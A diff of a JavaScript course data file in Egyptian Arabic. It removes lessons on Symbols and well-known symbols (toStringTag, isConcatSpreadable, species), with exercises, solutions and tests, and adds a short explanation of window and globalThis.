-| [[Symbol('id')]] | [['id']]: الوصف زي ما كتبته |
-| [[Symbol('')]] | [['']]: نص فاضي، بس موجود |
-| [[Symbol()]] | [[undefined]]: مفيش وصف خالص |
-
-وهو **للقراية بس**: مينفعش تغيّره، ومتبنيش عليه أي مقارنة، لأن ألف Symbol ممكن يبقى ليهم نفس الوصف.
-
----
-
-## ٣. Symbol كمفتاح: مستخبي من اللف
-
-~~~js
-const user = { name: 'Sara', [id]: 101 };
-console.log(user[id], Object.keys(user), JSON.stringify(user));
-for (const key in user) console.log('for...in شاف:', key);
-console.log(Object.getOwnPropertySymbols(user), Reflect.ownKeys(user));
-~~~
-
-~~~text الناتج
-101 [ 'name' ] {"name":"Sara"}
-for...in شاف: name
-[ Symbol(id) ] [ 'name', Symbol(id) ]
-~~~
-
-- [[ [id]: 101 ]] جوه الـ literal: الأقواس المربعة = computed key، يعني «المفتاح هو قيمة [[id]]» مش النص [['id']].
-- [[ user[id] ]] بيقرا القيمة. ([[user.id]] بالنقطة كانت هتدوّر على مفتاح نصي اسمه [['id']] وترجّع [[undefined]].)
-- [[Object.keys]] و [[JSON.stringify]] و [[for...in]]: مش شايفينه خالص.
-- [[Object.getOwnPropertySymbols]]: مفاتيح الـ Symbol بس. و [[Reflect.ownKeys]]: الكل، نصوص الأول وبعدين Symbols (درس «enumerability و ownership»).
-
-| الأداة | بتشوف مفاتيح الـ Symbol؟ |
-|---|---|
-| [[Object.keys]] و [[values]] و [[entries]] و [[for...in]] | لأ، بتتخطاها بقصد |
-| [[JSON.stringify]] و [[structuredClone]] | لأ، بتتشال من النسخة |
-| spread [[{ ...obj }]] و [[Object.assign]] | أيوه، بتتنسخ مع المفاتيح النصية |
-| [[Object.getOwnPropertySymbols]] و [[Reflect.ownKeys]] | أيوه، ودول الطريقة الوحيدة تعدّها |
-| [[in]] و [[Object.hasOwn]] | أيوه ([[id in user]] بـ [[true]]) |
-
----
-
-## ٤. [[Symbol.for]] و [[Symbol.keyFor]]: الـ registry العام
-
-~~~js
-const k1 = Symbol.for('app.cache');
-const k2 = Symbol.for('app.cache');
-console.log(k1 === k2, Symbol.keyFor(k1), Symbol.keyFor(id));
-~~~
-
-~~~text الناتج
-true app.cache undefined
-~~~
-
-- [[Symbol.for('app.cache')]]: «دوّر في الجدول العام على المفتاح [['app.cache']]: لو موجود رجّعه، لو لأ اعمله وسجّله». فالنداء التاني رجّع **نفس** الـ Symbol، و [[k1 === k2]] بـ [[true]].
-- [[Symbol.keyFor(k1)]]: بيرجّع المفتاح [['app.cache']]. و [[Symbol.keyFor(id)]] بـ [[undefined]] لأن [[id]] اتعمل بـ [[Symbol()]] ومش في الجدول.
-- الجدول ده واحد للبرنامج كله، فاكتب المفتاح بـ namespace ([['myapp.cache']] مش [['cache']]) عشان متتلاقيش مع مكتبة تانية.
-
-| | [[Symbol('x')]] | [[Symbol.for('x')]] |
-|---|---|---|
-| نداءين بنفس النص | اتنين مختلفين | نفس الواحد |
-| [[Symbol.keyFor]] | [[undefined]] | [['x']] |
-| ينفع مفتاح WeakMap | أيوه | لأ: [[TypeError: Invalid value used as weak map key]] |
-| بيتشاف من ملف تاني من غير import | لأ، لازم المتغير نفسه | أيوه، بنفس النص |
-
----
-
-## ٥. مبيتحوّلش لنص لوحده
-
-~~~js
-try { console.log('key: ' + id); } catch (e) { console.log(e.constructor.name + ': ' + e.message); }
-console.log('key: ' + id.description, $__btkey: $__{String(id)}$__bt);
-~~~
-
-~~~text الناتج
-TypeError: Cannot convert a Symbol value to a string
-key: id key: Symbol(id)
-~~~
-
-ده بقصد: لو [['key: ' + id]] كانت بتشتغل، كان سهل تعمل مفتاح نصي [['Symbol(id)']] وتفتكره الـ Symbol. فالتحويل **الضمني** ممنوع (نص و template literal و رقم: [[+id]] بيرمي [[Cannot convert a Symbol value to a number]])، والصريح مسموح: [[String(id)]] و [[id.toString()]] و [[id.description]]. والـ boolean عادي: أي Symbol truthy.
-
----
-
-## الخلاصة
-
-- [[Symbol()]] قيمة فريدة، والوصف للعرض بس، و [[description]] بيقراه.
-- مفتاح Symbol مستخبي من [[keys]] و [[for...in]] و JSON، بس **مش private**: [[getOwnPropertySymbols]] بيجيبه.
-- [[Symbol.for]] = نفس الـ Symbol لنفس النص في البرنامج كله، و [[Symbol.keyFor]] العكس.
-- التحويل لنص بإيدك بس: [[String(sym)]] أو [[sym.description]].
-- الدرس الجاي: الـ Symbols اللي اللغة نفسها عاملاها (well-known) وبتسأل عنها الـ objects بتاعتك.`,
-          lines: [
-            R`بيعمل Symbol جديد بوصف [['id']]. الوصف للعرض بس، القيمة نفسها فريدة.`,
-            R`Symbol تاني بنفس الوصف بالظبط، عشان نثبت إنهم مش متساويين.`,
-            R`بيطبع [[false]] (مختلفين)، و [[symbol]] نوعه، و [[id]] الوصف، و [[Symbol(id)]] لما حوّلناه لنص بإيدنا.`,
-            R`object فيه مفتاح نصي [[name]] ومفتاح Symbol [[ [id] ]]: الأقواس المربعة معناها «المفتاح هو قيمة المتغير».`,
-            R`[[ user[id] ]] بيرجّع 101، بس [[Object.keys]] شايف [['name']] بس، والـ JSON فيه [[name]] بس.`,
-            R`[[for...in]] بيلف على المفاتيح النصية enumerable بس، فطبع سطر واحد: [[name]].`,
-            R`[[getOwnPropertySymbols]] جاب مفتاح الـ Symbol، و [[Reflect.ownKeys]] جاب الاتنين: النص الأول وبعدين الـ Symbol.`,
-            R`[[Symbol.for]] بيدوّر في الـ registry العام على [['app.cache']]: مش موجود، فبيعمله ويسجّله.`,
-            R`نفس المفتاح تاني: المرة دي لقاه، فرجّع نفس الـ Symbol.`,
-            R`[[true]] لأنهم نفس القيمة، و [[keyFor]] رجّع المفتاح [[app.cache]]، و [[undefined]] لـ [[id]] لأنه مش متسجّل.`,
-            R`لزق Symbol في نص بـ [[+]] بيرمي TypeError، والـ [[catch]] بيطبع اسم الخطأ ورسالته.`,
-            R`الطريقة الصح: [[description]] بيدّي [[id]]، و [[String(id)]] جوه الـ template بيدّي [[Symbol(id)]] من غير error.`,
-          ],
-          ref: [
-            { t: "MDN: Symbol", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol" },
-            { t: "MDN: Symbol.prototype.description", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/description" },
-            { t: "MDN: Symbol.for()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/for" },
-            { t: "MDN: Symbol.keyFor()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/keyFor" },
-            { t: "ECMAScript: Symbol Objects", url: "https://tc39.es/ecma262/multipage/fundamental-objects.html#sec-symbol-objects" },
-          ],
-          pre: [{ to: "js/primitives و objects", why: R`الـ primitives السبعة، والـ Symbol واحد منهم` }, { to: "js/enumerability و ownership", why: R`[[Reflect.ownKeys]] و [[getOwnPropertySymbols]] ومين بيشوف أنهي مفتاح` }, { to: "js/WeakMap و WeakSet", why: R`مفاتيح الـ WeakMap وليه [[Symbol.for]] بيترفض` }],
-        },
-        {
-          cmd: "well-known symbols: Symbol.toStringTag و isConcatSpreadable",
-          title: "الـ Symbols اللي اللغة نفسها بتدوّر عليها في الـ object بتاعك: جدول كلهم، و toStringTag و isConcatSpreadable",
-          desc: R`الـ **well-known symbols** هما ١٣ Symbol جاهزين على [[Symbol]] نفسه ([[Symbol.iterator]] و [[Symbol.toStringTag]] و [[Symbol.match]]...). كل واحد فيهم «سؤال» اللغة بتسأله للـ object بتاعك في لحظة معيّنة: [[for...of]] بيسأل [[ obj[Symbol.iterator] ]]، و [[Object.prototype.toString]] بيسأل [[ obj[Symbol.toStringTag] ]]، و [[concat]] بيسأل [[ obj[Symbol.isConcatSpreadable] ]]. لو عرّفت الـ method أو الخاصية دي، سلوك اللغة مع الـ object بتاعك بيتغيّر.
-
-الدرس ده فيه جدول بكل الـ ١٣ ومين بيسأل كل واحد وفين اتشرح، وبعدين التلاتة اللي ملهمش درس تاني: [[Symbol.toStringTag]] (اسم النوع في [[[object X]]])، و [[Symbol.isConcatSpreadable]] (هل [[concat]] يفرد الـ object)، و [[Symbol.species]] على [[Promise]] و [[RegExp]].`,
-          example: R`// الـ well-known symbols: أسئلة اللغة بتسألها للـ object بتاعك
-const tag = (x) => Object.prototype.toString.call(x);
-console.log(tag([]), tag(new Map()), tag(Promise.resolve()), tag(null));
-class Cart {
-  items = ['tea', 'rice'];
-  get [Symbol.toStringTag]() { return 'Cart'; }
-  [Symbol.iterator]() { return this.items.values(); }
-}
-const cart = new Cart();
-console.log(tag(cart), String(cart), [...cart]);
-const pair = { length: 2, 0: 'a', 1: 'b', [Symbol.isConcatSpreadable]: true };
-console.log([1].concat(pair), [1].concat([2, 3]));
-const keep = [2, 3];
-keep[Symbol.isConcatSpreadable] = false;
-console.log([1].concat(keep).length);
-class Tracked extends Promise {}
-console.log(Tracked.resolve(1).then((x) => x) instanceof Tracked, Promise[Symbol.species] === Promise);`,
-          try: R`اعمل class اسمها [[Cart]] فيها getter [[ [Symbol.toStringTag] ]] بيرجّع [['ShoppingCart']] (اسم **مختلف** عن اسم الـ class)، واطبع [[new Cart()]] بـ [[console.log]] و [[String(new Cart())]]. وبعدين اعمل object عادي فيه [[ [Symbol.toStringTag]: 'Array' ]] وقارن [[Object.prototype.toString.call]] عليه بـ [[Array.isArray]].`,
-          sol: R`~~~js tag-try.mjs
-class Cart { get [Symbol.toStringTag]() { return 'ShoppingCart'; } }
-console.log(new Cart());
-console.log(String(new Cart()));
-const fake = { [Symbol.toStringTag]: 'Array' };
-console.log(Object.prototype.toString.call(fake), Array.isArray(fake));
-~~~
-
-~~~text الناتج (Node 24.22)
-Cart [ShoppingCart] {}
-[object ShoppingCart]
-[object Array] false
-~~~
-
-- Node بيكتب اسم الـ class ([[Cart]]) وجنبه الـ tag بين أقواس مربعة لما يختلفوا. ولما يبقوا زي بعض (المثال فوق) بيكتب [[Cart {}]] بس.
-- الـ tag **بيتزوّر بسهولة**: object عادي قال إنه [['Array']] و [[toString]] صدّقه. فـ [[Object.prototype.toString]] ينفع للعرض واللوج، **مش** لفحص النوع: استخدم [[Array.isArray]] و [[instanceof]] والـ brand checks (زي [[#field in obj]]).`,
-          practice: [
-            { lvl: 'سريع', t: R`**اقرا وتوقّع:** اكتب السطرين قبل التشغيل:
-
-~~~js
-const t = (x) => Object.prototype.toString.call(x);
-class User {}
-class Order { get [Symbol.toStringTag]() { return 'Order'; } }
-console.log(t(new User()), t(new Order()), t(undefined), t(function* () {}), t(1n));
-console.log(t({ [Symbol.toStringTag]: 'Array' }), Array.isArray({ [Symbol.toStringTag]: 'Array' }));
-~~~`, done: R`كتبت السطرين صح، وتقدر تقول ليه [[User]] طلعت [[Object]] مع إن ليها اسم.`, sol: R`~~~text الناتج (Node 24.22)
-[object Object] [object Order] [object Undefined] [object GeneratorFunction] [object BigInt]
-[object Array] false
-~~~
-
-- [[class User {}]] من غير tag: [[toString]] **مش** بيستخدم اسم الـ class (ده [[constructor.name]])، فبيقول [[Object]].
-- [[Order]] عرّفت الـ tag فظهر.
-- [[undefined]] و [[null]] ليهم حالة خاصة في [[toString]]: [[Undefined]] و [[Null]].
-- الـ generator function و BigInt عندهم tag جاهز على الـ prototype ([[ GeneratorFunction.prototype[Symbol.toStringTag] ]] و [[ BigInt.prototype[Symbol.toStringTag] ]]).
-- آخر سطر: الـ tag اتزوّر، و [[Array.isArray]] (اللي بيفحص النوع الحقيقي جوه المحرك) قال [[false]].` },
-            { lvl: 'تطبيق', t: R`**مسألة:** [[typeName(x)]] بترجّع اسم النوع زي ما [[Object.prototype.toString]] شايفه، من غير الكلمة [[[object ]]] والقوس اللي في الآخر: [['Null']] و [['Array']] و [['Map']] و [['AsyncFunction']]، والـ classes اللي ليها tag باسمها.`, done: R`[[typeName(null)]] بـ [['Null']]، و [[typeName([])]] بـ [['Array']]، و [[typeName(new Map())]] بـ [['Map']]، و [[typeName(new Invoice())]] بـ [['Invoice']] لو فيها tag، والتمرين اللي بيتصحح لوحده عدّى.`, sol: R`~~~js type-name.mjs
-function typeName(x) {
-  return Object.prototype.toString.call(x).slice(8, -1);
-}
-class Invoice { get [Symbol.toStringTag]() { return 'Invoice'; } }
-console.log([null, undefined, [], {}, new Map(), new Date(0), /x/, 5, 'a', Symbol(), 1n, async () => {}, new Invoice()].map(typeName).join(' '));
-console.log(typeof null, typeof [], typeof new Map());
-~~~
-
-~~~text الناتج (Node 24.22)
-Null Undefined Array Object Map Date RegExp Number String Symbol BigInt AsyncFunction Invoice
-object object object
-~~~
-
-**الشرح:** [[[object ]]] طولها ٨ حروف، فـ [[slice(8, -1)]] بيشيلها ويشيل القوس المربع الأخير. و [[.call(x)]] لازم: لو كتبت [[x.toString()]] هتنادي [[toString]] بتاعة النوع نفسه (الـ array بترجّع العناصر مفصولة بـ [[,]]، و [[null.toString()]] بترمي TypeError). والسطر التاني بيوضح ليه الدالة دي أدق من [[typeof]] اللي بيقول [[object]] للتلاتة. بس افتكر: للعرض واللوج، مش للأمان.` },
-            { lvl: 'تطبيق', t: R`**ابني:** [[class RowList extends Array]] بتمثّل صفوف جدول (كل صف array). عايز [[[header].concat(rows)]] يحط الـ [[RowList]] كلها كعنصر **واحد** (مش يفرد الصفوف)، بـ [[Symbol.isConcatSpreadable]].`, done: R`[[[header].concat(rows)]] طوله 2 والعنصر التاني هو [[rows]] نفسها (بـ [[===]])، و [[concat]] على array صفوف عادية طوله 3.`, sol: R`~~~js row-list.mjs
-class RowList extends Array {
-  get [Symbol.isConcatSpreadable]() { return false; }
-}
-const header = ['name', 'qty'];
-const rows = RowList.from([['tea', 3], ['rice', 7]]);
-const table = [header].concat(rows);
-console.log(table.length, table[1] === rows, table[1].length);
-const flat = [header].concat([['tea', 3], ['rice', 7]]);
-console.log(flat.length);
-~~~
-
-~~~text الناتج (Node 24.22)
-2 true 2
-3
-~~~
-
-**الشرح:** [[concat]] بيسأل كل argument: [[ arg[Symbol.isConcatSpreadable] ]]. لو [[undefined]] (الافتراضي) بيفرد الـ arrays بس، ولو [[false]] مبيفردش حتى لو array، ولو [[true]] بيفرد أي object عنده [[length]]. الـ getter على الـ prototype بيطبّق القاعدة على كل [[RowList]] من غير ما تحطها على كل واحدة بإيدك. والـ spread ([[[...rows]]]) **مش** بيسأل الـ Symbol ده خالص: بيستخدم [[Symbol.iterator]]، فبيفرد عادي.` },
-            { lvl: 'تحدي', t: R`**صلّح الكود البايظ:** [[TimedPromise]] بتعدّ كل مرة بتتعمل فيها. الكود ده المفروض يعمل واحدة بس، بس العدّاد بيقول رقم أكبر بكتير. لاقي الرقم الحقيقي، وليه، وصلّحه بـ [[Symbol.species]]:
-
-~~~js
-let created = 0;
-class TimedPromise extends Promise {
-  constructor(executor) { super(executor); created++; }
-}
-const p = TimedPromise.resolve(5).then((x) => x + 1).then((x) => x * 2).finally(() => {});
-await p;
-console.log('created', created, p instanceof TimedPromise);
-~~~`, done: R`قبل التصليح العدّاد بـ 8، وبعده بـ 1 والناتج 12، وتقدر تقول [[then]] و [[finally]] بيعملوا Promise جديدة من أنهي class.`, sol: R`~~~text الناتج قبل التصليح (Node 24.22)
-created 8 true
-~~~
-
-كل [[then]] بترجّع Promise **جديدة**، وبتعملها بـ [[ this.constructor[Symbol.species] ]]، واللي افتراضيًا هو الـ class نفسها. فكل [[then]] و [[finally]] بيعملوا [[TimedPromise]] (و [[finally]] بتنادي [[then]] من جوه وبتعمل كمان). النتيجة ٨ مع إنك كتبت سطر واحد.
-
-~~~js timed-fixed.mjs
-let created = 0;
-class TimedPromise2 extends Promise {
-  static get [Symbol.species]() { return Promise; }
-  constructor(executor) { super(executor); created++; }
-}
-const p2 = TimedPromise2.resolve(5).then((x) => x + 1).then((x) => x * 2).finally(() => {});
-console.log(await p2, 'created', created, p2 instanceof TimedPromise2);
-~~~
-
-~~~text الناتج (Node 24.22)
-12 created 1 false
-~~~
-
-**الشرح:** [[ static get [Symbol.species]() { return Promise; } ]] بيقول «النتايج المشتقة مني تبقى Promise عادية». فالعدّاد 1 (الـ [[resolve]] بس، لأن الـ static methods زي [[resolve]] و [[all]] بتستخدم [[this]] مش الـ species). والتمن: [[p2]] بقت Promise عادية، فأي method زوّدتها في الـ class مش هتبقى موجودة بعد أول [[then]]. اختار حسب اللي محتاجه.` },
-            { lvl: 'تحدي', t: R`**دوّر بنفسك:** من غير ما تبص في الدرس، اكتب سكربت بيلف على كل الـ constructors الـ global وعلى الـ [[prototype]] بتاعهم، ويطبع لكل well-known symbol: مين عنده الخاصية دي **own**. مين الوحيد اللي عنده [[Symbol.hasInstance]]؟ وكام واحد عنده [[Symbol.toStringTag]]؟`, done: R`السكربت بيطبع ١٥ سطر (الـ ١٣ ومعاهم [[dispose]] و [[asyncDispose]])، ولقيت إن [[hasInstance]] على [[Function.prototype]] بس، والـ string methods الأربعة على [[RegExp.prototype]] بس، و [[isConcatSpreadable]] محدش عنده.`, sol: R`~~~js who-has.mjs
-const wellKnown = Object.getOwnPropertyNames(Symbol).filter((n) => typeof Symbol[n] === 'symbol');
-const globals = Object.getOwnPropertyNames(globalThis).filter((n) => /^[A-Z]/.test(n) && typeof globalThis[n] === 'function' || ['Math', 'JSON', 'Atomics', 'Reflect'].includes(n));
-const where = {};
-for (const name of wellKnown) where[name] = [];
-for (const g of globals) {
-  const C = globalThis[g];
-  for (const [label, obj] of [[g, C], [g + '.prototype', C.prototype]]) {
-    if (!obj || (typeof obj !== 'object' && typeof obj !== 'function')) continue;
-    for (const name of wellKnown) if (Object.hasOwn(obj, Symbol[name])) where[name].push(label);
-  }
-}
-for (const [name, list] of Object.entries(where)) console.log(name.padEnd(18), list.length, list.slice(0, 6).join(' '));
-~~~
-
-~~~text الناتج (Node 24.22)
-asyncIterator      1 ReadableStream.prototype
-hasInstance        1 Function.prototype
-isConcatSpreadable 0
-iterator           8 Array.prototype String.prototype Map.prototype Set.prototype Iterator.prototype URLSearchParams.prototype
-match              1 RegExp.prototype
-matchAll           1 RegExp.prototype
-replace            1 RegExp.prototype
-search             1 RegExp.prototype
-species            8 Array Promise RegExp ArrayBuffer Map Set
-split              1 RegExp.prototype
-toPrimitive        2 Symbol.prototype Date.prototype
-toStringTag        63 Symbol.prototype Promise.prototype JSON Math ArrayBuffer.prototype Atomics
-unscopables        1 Array.prototype
-dispose            2 Iterator.prototype DisposableStack.prototype
-asyncDispose       1 AsyncDisposableStack.prototype
-~~~
-
-**اللي يتقري من الجدول:** [[isConcatSpreadable]] صفر: مفيش built-in بيعرّفه، كله بيعتمد على [[Array.isArray]] الافتراضي. و [[asyncIterator]] ظهر مرة واحدة بس لأن الـ prototype اللي عليه ([[AsyncIterator.prototype]]) مش global (درس «AsyncIterator و async generators»)، و [[ReadableStream]] عنده نسخته. والسكربت بيشوف الـ globals بس: الـ generators والـ iterators بتوع [[Map]] مثلًا عندهم tags ([[Map Iterator]]) على prototypes مالهاش اسم global.` },
-          ],
-          check: { lang: "js", starter: R`function typeName(x) {
-  // اسم النوع من Object.prototype.toString من غير [object و ]
-}`, tests: R`test("null", () => expect(typeName(null)).toBe('Null'));
-test("undefined", () => expect(typeName(undefined)).toBe('Undefined'));
-test("array", () => expect(typeName([1])).toBe('Array'));
-test("Map", () => expect(typeName(new Map())).toBe('Map'));
-test("async function", () => expect(typeName(async () => {})).toBe('AsyncFunction'));
-test("class بـ tag", () => { class Invoice { get [Symbol.toStringTag]() { return 'Invoice'; } } expect(typeName(new Invoice())).toBe('Invoice'); });
-test("class من غير tag", () => { class User {} expect(typeName(new User())).toBe('Object'); });`, solution: R`function typeName(x) {
-  return Object.prototype.toString.call(x).slice(8, -1);
-}` },
-          flag: "script",
-          deep: {
-            why: R`الـ well-known symbols هما الطريقة اللي اللغة بتفتح بيها «أبواب» في سلوكها لكودك من غير ما تكسر كود قديم. من غيرهم مكنش ينفع class بتاعتك تشتغل مع [[for...of]] أو [[instanceof]] أو [[str.replace]] أو تتحوّل لرقم بطريقتها. ولما تعرف الجدول، أي سلوك «غريب» في built-in ([[concat]] بيفرد ده ومبيفردش ده، [[then]] بيرجّع class غريبة) بيبقى ليه تفسير واحد: فيه Symbol اتسأل.`,
-            how: R`كل well-known symbol قيمة ثابتة على [[Symbol]] (مش في الـ registry: [[Symbol.keyFor(Symbol.iterator)]] بـ [[undefined]])، ومشتركة بين كل الـ realms. والمواصفة بتكتب الخطوات بالظبط: [[Object.prototype.toString]] بيعمل [[Get(O, @@toStringTag)]] ولو الناتج نص بيستخدمه بدل الاسم الافتراضي، وإلا بيستخدم builtinTag ([[Array]] و [[Function]] و [[Error]] و [[Boolean]] و [[Number]] و [[String]] و [[Date]] و [[RegExp]] و [[Arguments]] أو [[Object]]). و [[Array.prototype.concat]] بيعمل IsConcatSpreadable: لو [[ O[@@isConcatSpreadable] ]] مش [[undefined]] بياخد قيمته كـ boolean، وإلا بيرجع لـ [[IsArray(O)]]. و [[Promise.prototype.then]] بيعمل SpeciesConstructor: بيقرا [[this.constructor]] وبعدين [[ [@@species] ]] منه، ولو [[undefined]] بيستخدم [[Promise]].
-
-ولأن السؤال بيتعمل بـ [[Get]] عادي، الإجابة ممكن تبقى خاصية عادية، أو getter، أو موروثة من الـ prototype، أو حتى Proxy بيرد عليها.`,
-            when: R`[[Symbol.toStringTag]]: لأي class بتاعتك هتظهر في لوج أو error أو debugger، عشان [[[object Object]]] متبقاش مكتوبة في كل حتة. [[Symbol.isConcatSpreadable]]: نادر، لـ array-like بتاعتك عايزها تتفرد في [[concat]]، أو subclass من Array عايزها تفضل عنصر واحد. [[Symbol.species]]: لما تعمل subclass من [[Promise]] أو [[Array]] أو [[RegExp]] وعايز تقرر النتايج المشتقة تبقى من الـ class بتاعتك ولا الأصلية. والباقيين ليهم دروس (الجدول).`,
-            mistakes: R`- تستخدم [[Object.prototype.toString]] لفحص النوع في كود أمان: الـ tag بيتزوّر بسطر.
-- تكتب [[obj.toStringTag = 'X']] (مفتاح نصي) بدل [[ obj[Symbol.toStringTag] ]].
-- تفتكر الـ tag بيغيّر [[typeof]] أو [[instanceof]]: لأ خالص، ده للنص بس.
-- تفتكر [[Symbol.species]] بيأثّر على [[TimedPromise.resolve]] و [[Promise.all]]: الـ static methods بتستخدم [[this]] (اتجرّب: [[Job.all([1]) instanceof Job]] بـ [[true]] حتى مع species = [[Promise]]).
-- تفتكر [[Symbol.isConcatSpreadable]] بيأثّر على الـ spread أو [[flat]]: الاتنين مبيسألوهوش. ([[flat]] بيفحص [[Array.isArray]].)
-- تنسى إن الـ getter على الـ prototype موروث لكل الـ subclasses: subclass ممكن تحتاج tag باسمها.`,
-          },
-          teach: R`## الفكرة في سطر
-
-اللغة في لحظات معيّنة بتبص على الـ object بتاعك وتسأله سؤال بمفتاح Symbol ثابت. لو جاوبت، سلوكها بيتغيّر. الناتج من Node 24.22.
-
----
-
-## ١. كل الـ well-known symbols في جدول واحد
-
-| الـ Symbol | مين بيسأله | اتشرح فين |
-|---|---|---|
-| [[Symbol.iterator]] | [[for...of]] و spread و destructuring و [[Array.from]] و [[new Map(it)]] و [[Promise.all]] | «iteration protocols» في الوحدة دي، و «iterators و generators» |
-| [[Symbol.asyncIterator]] | [[for await...of]] و [[Array.fromAsync]] | «AsyncIterator و async generators» في الوحدة دي |
-| [[Symbol.hasInstance]] | [[x instanceof C]] بيسأل [[ C[Symbol.hasInstance] ]] | «Function: length و name و toString و new.target» |
-| [[Symbol.toPrimitive]] | أي تحويل لرقم أو نص ([[+]] و [[String()]] و template) | «valueOf و toString و Symbol.toPrimitive» |
-| [[Symbol.toStringTag]] | [[Object.prototype.toString]] واللي بيستخدمه، و [[console.log]] في Node | الدرس ده، القسم ٢ |
-| [[Symbol.isConcatSpreadable]] | [[Array.prototype.concat]] | الدرس ده، القسم ٣ |
-| [[Symbol.species]] | [[map]] و [[filter]] و [[slice]] في الـ arrays، و [[then]] في الـ Promise، و [[split]] و [[matchAll]] في الـ RegExp | «Array[Symbol.species] و Symbol.unscopables»، والقسم ٤ هنا |
-| [[Symbol.unscopables]] | [[with]] بيسأل عن أسامي يخبّيها | «Array[Symbol.species] و Symbol.unscopables» |
-| [[Symbol.match]] | [[str.match(x)]]، وكمان [[startsWith]] و [[includes]] و [[endsWith]] عشان يعرفوا لو x regex | «RegExp و Symbol.match و Symbol.replace» في الوحدة دي |
-| [[Symbol.matchAll]] | [[str.matchAll(x)]] | نفس الدرس |
-| [[Symbol.replace]] | [[str.replace(x, ...)]] و [[replaceAll]] | نفس الدرس |
-| [[Symbol.search]] | [[str.search(x)]] | نفس الدرس |
-| [[Symbol.split]] | [[str.split(x)]] | نفس الدرس |
-
-وفيه اتنين أحدث: [[Symbol.dispose]] و [[Symbol.asyncDispose]] لجملة [[using]] (explicit resource management)، موجودين في Node 24 بس لسه مش في كل المتصفحات، فمش في المنهج دلوقتي.
-
-كلهم بيتقروا بـ [[Object.getOwnPropertyNames(Symbol)]] وفلتر على النوع، وده اتشغّل وطلّع الـ ١٥:
-
-~~~text الناتج
-asyncIterator hasInstance isConcatSpreadable iterator match matchAll replace search species split toPrimitive toStringTag unscopables dispose asyncDispose
-~~~
-
----
-
-## ٢. [[Symbol.toStringTag]]: اسم النوع في [[[object X]]]
-
-~~~js
-const tag = (x) => Object.prototype.toString.call(x);
-console.log(tag([]), tag(new Map()), tag(Promise.resolve()), tag(null));
-~~~
-
-~~~text الناتج
-[object Array] [object Map] [object Promise] [object Null]
-~~~
-
-- [[Object.prototype.toString]]: الـ [[toString]] الأصلية بتاعة كل object. بنناديها بـ [[.call(x)]] عشان نتخطى أي [[toString]] تانية الـ x عنده (الـ array مثلًا عنده واحدة بترجّع العناصر).
-- [[Map]] و [[Promise]] عندهم [[ [Symbol.toStringTag] ]] على الـ prototype بقيمة [['Map']] و [['Promise']]، وده اللي ظهر.
-- [[Array]] و [[null]] حالات خاصة جوه [[toString]] نفسها.
-
-### تعرّفه في class بتاعتك
-
-~~~js
-class Cart {
-  items = ['tea', 'rice'];
-  get [Symbol.toStringTag]() { return 'Cart'; }
-  [Symbol.iterator]() { return this.items.values(); }
-}
-const cart = new Cart();
-console.log(tag(cart), String(cart), [...cart]);
-~~~
-
-~~~text الناتج
-[object Cart] [object Cart] [ 'tea', 'rice' ]
-~~~
-
-- [[ get [Symbol.toStringTag]() ]]: getter على الـ prototype، فكل [[Cart]] بتورثه ومش بيظهر كخاصية في كل instance.
-- [[String(cart)]] طلّع نفس الحاجة لأن [[String]] بينادي [[toString]] الموروثة من [[Object.prototype]].
-- [[ [Symbol.iterator]() ]] جاوب سؤال تاني من الجدول: الـ spread اشتغل.
-
-### الأشكال التلاتة اتجرّبت
-
-| مكان الـ tag | [[toString]] على الـ instance | [[console.log]] في Node |
-|---|---|---|
-| getter على الـ prototype بنفس اسم الـ class | [[[object Cart]]] | [[Cart {}]] |
-| getter باسم مختلف ([['ShoppingCart']]) | [[[object ShoppingCart]]] | [[Cart [ShoppingCart] {}]] |
-| خاصية عادية على object ([[ { [Symbol.toStringTag]: 'Config', port: 80 } ]]) | [[[object Config]]] | [[{ port: 80, Symbol(Symbol.toStringTag): 'Config' }]] |
-| [[static [Symbol.toStringTag] = 'BoxClass']] | الـ class نفسها [[BoxClass]]، والـ instance [[Object]] | الـ static على الـ class مش على الـ instances |
-
----
-
-## ٣. [[Symbol.isConcatSpreadable]]: [[concat]] يفرد ولا لأ
-
-~~~js
-const pair = { length: 2, 0: 'a', 1: 'b', [Symbol.isConcatSpreadable]: true };
-console.log([1].concat(pair), [1].concat([2, 3]));
-const keep = [2, 3];
-keep[Symbol.isConcatSpreadable] = false;
-console.log([1].concat(keep).length);
-~~~
-
-~~~text الناتج
-[ 1, 'a', 'b' ] [ 1, 2, 3 ]
-2
-~~~
-
-[[concat]] بيسأل كل argument: [[ arg[Symbol.isConcatSpreadable] ]].
-
-| الإجابة | [[concat]] بيعمل إيه |
-|---|---|
-| [[undefined]] (الافتراضي) | بيفرد لو [[Array.isArray]]، وإلا بيحطه عنصر واحد |
-| [[true]] | بيفرد أي object عنده [[length]]، زي [[pair]] (array-like) |
-| [[false]] | بيحطه عنصر واحد حتى لو array، زي [[keep]] فالطول بقى 2 مش 3 |
-
----
-
-## ٤. [[ Promise[Symbol.species] ]] و [[ RegExp[Symbol.species] ]]
-
-درس «Array[Symbol.species]» شرح الفكرة على الـ arrays. نفس السؤال بيتسأل في [[Promise]] و [[RegExp]]:
-
-~~~js
-class Tracked extends Promise {}
-console.log(Tracked.resolve(1).then((x) => x) instanceof Tracked, Promise[Symbol.species] === Promise);
-~~~
-
-~~~text الناتج
+~~~text الناتج: سطر ١ و ٤ في المثال
 true true
+متجر النور undefined
 ~~~
 
-- [[then]] بترجّع Promise جديدة، من [[ this.constructor[Symbol.species] ]]. والافتراضي getter بيرجّع [[this]]، يعني الـ subclass نفسها، فـ [[Tracked]] فضلت [[Tracked]] بعد [[then]].
-- لو عايز النتايج Promise عادية: [[ static get [Symbol.species]() { return Promise; } ]] (تمرين «صلّح» تحت فيه الفرق في عدد الـ objects اللي بتتعمل: ٨ مقابل ١).
+**[[window === globalThis]]:** الـ global object هو الـ object اللي الأسامي العامة بتتدوّر فيه لو مش لاقيها في أي scope. في المتصفح اسمه [[window]] (وكمان [[self]] و [[frames]])، وفي الـ Web Worker اسمه [[self]]، وفي Node اسمه [[global]]. [[globalThis]] (ES2020) هو الاسم الموحّد اللي شغال في الكل، فلو كاتب مكتبة تشتغل في أكتر من مكان استخدمه.
 
